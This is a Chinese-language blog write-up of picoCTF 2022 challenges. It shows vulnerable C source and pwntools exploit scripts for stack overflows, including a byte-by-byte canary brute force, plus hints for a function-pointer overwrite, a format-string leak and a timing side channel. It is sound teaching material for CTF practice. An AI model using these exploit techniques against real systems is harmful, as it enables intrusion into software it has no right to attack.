@@ -1,0 +1,254 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>pico22-writeup | Retr0 's blog</title><meta name="keywords" content="Pwns"><meta name="author" content="Retr0mous"><meta name="copyright" content="Retr0mous"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="0x01 前言这次有幸参加了 Carnegie Mellon University，也就是卡巴梅隆大学的Pico CTF 截止到现在，3月21号，目前本人战绩如下：  主题来说，这次CTF的难度没有很高，Pwn系列题目没有堆题，主要是考察选手栈的升入理解，以及GDB动态能力；有幸帮助队伍解开了Forensics两道高分题目，其实不是很难，哈哈 Binary ExploitationBasic-fi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pico22-writeup">
+<meta property="og:url" content="https://retr0.blog/2022/03/21/pico22-writeup/index.html">
+<meta property="og:site_name" content="Retr0 &#39;s blog">
+<meta property="og:description" content="0x01 前言这次有幸参加了 Carnegie Mellon University，也就是卡巴梅隆大学的Pico CTF 截止到现在，3月21号，目前本人战绩如下：  主题来说，这次CTF的难度没有很高，Pwn系列题目没有堆题，主要是考察选手栈的升入理解，以及GDB动态能力；有幸帮助队伍解开了Forensics两道高分题目，其实不是很难，哈哈 Binary ExploitationBasic-fi">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DDizzzy79/cdn/post/src=http___img2.doubanio.com_view_richtext_large_public_p190170482.jpg&refer=http___img2.doubanio.jpg">
+<meta property="article:published_time" content="2022-03-21T12:58:15.000Z">
+<meta property="article:modified_time" content="2022-03-21T14:20:59.820Z">
+<meta property="article:author" content="Retr0mous">
+<meta property="article:tag" content="Pwns">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/DDizzzy79/cdn/post/src=http___img2.doubanio.com_view_richtext_large_public_p190170482.jpg&refer=http___img2.doubanio.jpg"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/DDizzzy79/cdn/postsyUZaVkEDHLietzh.png"><link rel="canonical" href="https://retr0.blog/2022/03/21/pico22-writeup/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?eea21feebc3feb19c3c7a1f6ec19c0db";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'pico22-writeup',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-03-21 22:20:59'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.min.css" media="defer" onload="this.media='all'"><script async src="https://cdn.jsdelivr.net/npm/hexo-butterfly-tag-plugins-plus@latest/lib/carousel-touch.min.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://cdn.jsdelivr.net/gh/DDizzzy79/cdn/posts0c5201b6e89c8bbdd96b3f6033afa50a_q.jpg-1170x741" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/update/"><i class="fa-fw fas fa-angle-double-up"></i><span> Updates</span></a></div><div class="menus_item"><a class="site-page" href="/AC/"><i class="fa-fw fas fa-fan"></i><span> Aircondit</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/DDizzzy79/cdn/post/src=http___img2.doubanio.com_view_richtext_large_public_p190170482.jpg&amp;refer=http___img2.doubanio.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Retr0 's blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/update/"><i class="fa-fw fas fa-angle-double-up"></i><span> Updates</span></a></div><div class="menus_item"><a class="site-page" href="/AC/"><i class="fa-fw fas fa-fan"></i><span> Aircondit</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">pico22-writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-21T12:58:15.000Z" title="发表于 2022-03-21 20:58:15">2022-03-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-03-21T14:20:59.820Z" title="更新于 2022-03-21 22:20:59">2022-03-21</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="pico22-writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>这次有幸参加了 Carnegie Mellon University，也就是卡巴梅隆大学的Pico CTF 截止到现在，3月21号，目前本人战绩如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/DDizzzy79/cdn/post/20220321210526.png" alt=""></p>
+<p>主题来说，这次CTF的难度没有很高，Pwn系列题目没有堆题，主要是考察选手栈的升入理解，以及GDB动态能力；有幸帮助队伍解开了Forensics两道高分题目，其实不是很难，哈哈</p>
+<h1 id="Binary-Exploitation"><a href="#Binary-Exploitation" class="headerlink" title="Binary Exploitation"></a>Binary Exploitation</h1><h2 id="Basic-file-exp"><a href="#Basic-file-exp" class="headerlink" title="Basic-file exp"></a>Basic-file exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((entry_number = strtol(entry, <span class="literal">NULL</span>, <span class="number">10</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="built_in">puts</span>(flag);</span><br><span class="line">  fseek(<span class="built_in">stdin</span>, <span class="number">0</span>, SEEK_END);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>完全的签到，输入的<code>entry == 0</code>直接打印<code>flag</code></p>
+<h2 id="Buffer-overflow-zero"><a href="#Buffer-overflow-zero" class="headerlink" title="Buffer overflow zero"></a>Buffer overflow zero</h2><p>因为程序堆溢出做出了检查,如果检查到溢出，就打印<code>flag</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">signal(<span class="number">11</span>, (<span class="keyword">__sighandler_t</span>)sigsegv_handler); <span class="comment">// --&gt; puts(flag);</span></span><br></pre></td></tr></table></figure>
+<p>直接溢出即可;</p>
+<h2 id="Buffer-overflow-one"><a href="#Buffer-overflow-one" class="headerlink" title="Buffer overflow one"></a>Buffer overflow one</h2><p>基本栈溢出，<code>offset = 44</code> 溢出后返回到<code>win</code>函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io = conn()</span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Please enter your string: \n&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*offset + p32(<span class="number">0x80491F6</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Buffer-overflow-Two"><a href="#Buffer-overflow-Two" class="headerlink" title="Buffer overflow Two"></a>Buffer overflow Two</h2><p>需要控制函数的参数，正常打</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----------+</span><br><span class="line">l padding  l</span><br><span class="line">+----------+ ---- &gt; rbp                  </span><br><span class="line">l ret_addr l</span><br><span class="line">------------              payload =  <span class="string">&#x27;a&#x27;</span> * offset + p32(win) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xCAFEF00D</span>) + p32(<span class="number">0xF00DF00D</span>)</span><br><span class="line">l fake_ret l</span><br><span class="line">-----------+</span><br><span class="line">l   args   l</span><br><span class="line">------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="buffer-overflow-Three"><a href="#buffer-overflow-Three" class="headerlink" title="buffer overflow Three"></a>buffer overflow Three</h2><p>这题算比较有意思的，需要你获取栈上的<code>canary</code>，但是由于是固定的，可以直接 <code>One-by-One</code> 爆破</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// set_canary</span></span><br><span class="line"><span class="keyword">char</span> global_canary[CANARY_SIZE];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_canary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;canary.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;canary.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;own debugging canary.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fread(global_canary,<span class="keyword">sizeof</span>(<span class="keyword">char</span>),CANARY_SIZE,f);</span><br><span class="line">  fclose(f);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// test canary in main</span></span><br><span class="line">	<span class="comment">// ................</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">memcmp</span>(canary,global_canary,CANARY_SIZE)) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;***** Stack Smashing Detected ***** : Canary Value Corrupt!\n&quot;</span>); <span class="comment">// crash immediately</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>我们需要一字节一字节的爆破<code>canary</code> 如果我们输入的单个字节是正确的，则不会报错，反正，则会报错:</p>
+<p><code>EXP</code>如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">cancary = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_canary</span>():</span></span><br><span class="line">    cancary = <span class="string">&#x27;&#x27;</span> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">            offset = **** <span class="comment"># find by your self :)</span></span><br><span class="line">            io = conn()</span><br><span class="line">            io.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))                                 <span class="comment">#       l Paddings.... l</span></span><br><span class="line">            io.sendafter(<span class="string">&quot;Input&gt; &quot;</span>,<span class="string">&#x27;a&#x27;</span>*offset+cancary+<span class="built_in">chr</span>(j))              <span class="comment">#       +--------------+</span></span><br><span class="line">            time.sleep(<span class="number">0.1</span>)                                                <span class="comment">#       l canary       l ----&gt; overflowed</span></span><br><span class="line">            result = io.recvline()                                         <span class="comment">#       +--------------+</span></span><br><span class="line">            <span class="keyword">if</span> result == <span class="string">&quot;Ok... Now Where&#x27;s the Flag?\n&quot;</span>:  </span><br><span class="line">                log.success(cancary)</span><br><span class="line">                cancary += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> cancary</span><br><span class="line"></span><br><span class="line">io = conn()</span><br><span class="line">canary = leak_canary()</span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">64</span>+canary+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p32(<span class="number">0x8049336</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;Input&gt; &quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="RPS"><a href="#RPS" class="headerlink" title="RPS"></a>RPS</h2><p>RPC ,则是 <code>Rock-Paper-Scissor</code>的缩写，目标会控制对手用<code>time(0)</code>为种子，加载随机数下标，的方式与我们玩石头剪刀布，而我们需要连续赢5次才可以获取到<code>Flag</code>,我们猜中的概率太小了，但是，由于是伪随机，我们可以在控制对手出的同时打开一个同样为<code>time(0)</code>为种子的程序，输出随机数。这样我们输出的随机数和目标机器的会相同，但是，这里有个细节，<strong>机器的石头剪刀布列表中的石头，剪刀，布的位置和用户的石头剪刀布的列表是不一样的，需要注意</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> computer_turn = rand() % <span class="number">3</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You played: %s\n&quot;</span>, player_turn);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The computer played: %s\n&quot;</span>, hands[computer_turn]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//char* hands[3] = &#123;&quot;rock&quot;, &quot;paper&quot;, &quot;scissors&quot;&#125;;</span></span><br><span class="line"><span class="comment">//char* loses[3] = &#123;&quot;paper&quot;, &quot;scissors&quot;, &quot;rock&quot;&#125;;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(player_turn, loses[computer_turn])) &#123; <span class="comment">// &lt;--- detecting....</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You win! Play again?&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Seems like you didn&#x27;t win this time. Play again?&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里不给<code>EXP</code>了哦，大家自己试一试，现在比赛还在打呢，我看比赛比完了给大家，可以在执行到猜拳函数的时候在开个<code>process()</code></p>
+<h2 id="ROP-fu-amp-amp-Wine"><a href="#ROP-fu-amp-amp-Wine" class="headerlink" title="ROP-fu &amp;&amp; Wine"></a>ROP-fu &amp;&amp; Wine</h2><p> 这两题都比较基础，ret2syscall和windows栈溢出，完全没有难度，大家自己做吧哈哈哈</p>
+<p><em>小提示：windows栈溢出直接用普通栈溢出思想就行了</em></p>
+<h2 id="Function-Overwrite"><a href="#Function-Overwrite" class="headerlink" title="Function Overwrite"></a>Function Overwrite</h2><p>漏洞函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> (*check)(<span class="keyword">char</span>*, <span class="keyword">size_t</span>) = hard_checker;</span><br><span class="line">  <span class="keyword">char</span> story[<span class="number">128</span>];</span><br><span class="line">  <span class="keyword">int</span> num1, num2;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me a story and then I&#x27;ll tell you if you&#x27;re a 1337 &gt;&gt; &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%127s&quot;</span>, story);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;num1, &amp;num2);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (num1 &lt; <span class="number">10</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    fun[num1] += num2;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  check(story, <span class="built_in">strlen</span>(story));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>Check</code>函数们和子类函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">calculate_story_score</span><span class="params">(<span class="keyword">char</span> *story, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> score = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    score += story[i];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> score;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">easy_checker</span><span class="params">(<span class="keyword">char</span> *story, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (calculate_story_score(story, len) == <span class="number">1337</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">char</span> buf[FLAGSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (f == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                      <span class="string">&quot;own debugging flag.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fgets(buf, FLAGSIZE, f); <span class="comment">// size bound read</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You&#x27;re 1337. Here&#x27;s the flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You&#x27;ve failed this class.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hard_checker</span><span class="params">(<span class="keyword">char</span> *story, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (calculate_story_score(story, len) == <span class="number">13371337</span>)</span><br><span class="line">  <span class="comment">// all same , won&#x27;t display.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，check函数默认加载的是hard check函数，并且调用<code>calculate_story_score</code>把<code>story</code>数组的每一位相加。但是我们知道，一位字符，最大只能是<code>0xff</code>,也就是<code>\xff</code>，127个最大也只能累加到<code>0xff * 127</code>也就是<code>32385</code>，和<code>13371337</code>差者远呢，同时，<strong>主函数对于数组的下表也没有检查</strong>，所以我们要通过数组溢出，修改<code>check</code>指针，修改成<code>easy_cheak</code></p>
+<p>一样，只给两个提示：</p>
+<ul>
+<li>1337 = <code>(0x50 * 16) + 0x39</code></li>
+<li>修改的内容，是偏移</li>
+</ul>
+<h2 id="flag-leak"><a href="#flag-leak" class="headerlink" title="flag leak"></a>flag leak</h2><p>格式化字符串，<code>%x</code>泄露栈内flag</p>
+<h2 id="stack-cache"><a href="#stack-cache" class="headerlink" title="stack cache"></a>stack cache</h2><p>保存的<code>retaddress</code>返回到特定函数，泄露<code>flag</code></p>
+<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><p>只做了两题，也只会将两题</p>
+<h2 id="SideChannel"><a href="#SideChannel" class="headerlink" title="SideChannel"></a>SideChannel</h2><p>这题出的很有意思，首先，根据名字和提示所说，我们知道，这是一道和旁路攻击有关的题目</p>
+<blockquote>
+<p>旁路攻击（Side Channel Attacks，SCA），密码学中是指绕过对加密算法的繁琐分析，利用密码算法的硬件实现的运算中泄露的信息，如执行时间、功耗、电磁辐射等，结合统计理论快速的破解密码系统。</p>
+</blockquote>
+<p>emmm,题目要我们破解一个8位的数字验证码,如果我们直接爆破，则需要<code>10^8</code>次尝试，可以说是天文数字了,<strong>但是，经过后续的观察，由于算法的原因，我们可以使用时间旁道攻击。</strong>其实，说白了，在进行比对的时候，只有第一位正确，才会进入下一位检擦，那么就说明了，检查特定开头的数字，所需要的时间也不同，因此，我们只需要找出每一位数据的<code>outlier</code>，就能找出密码</p>
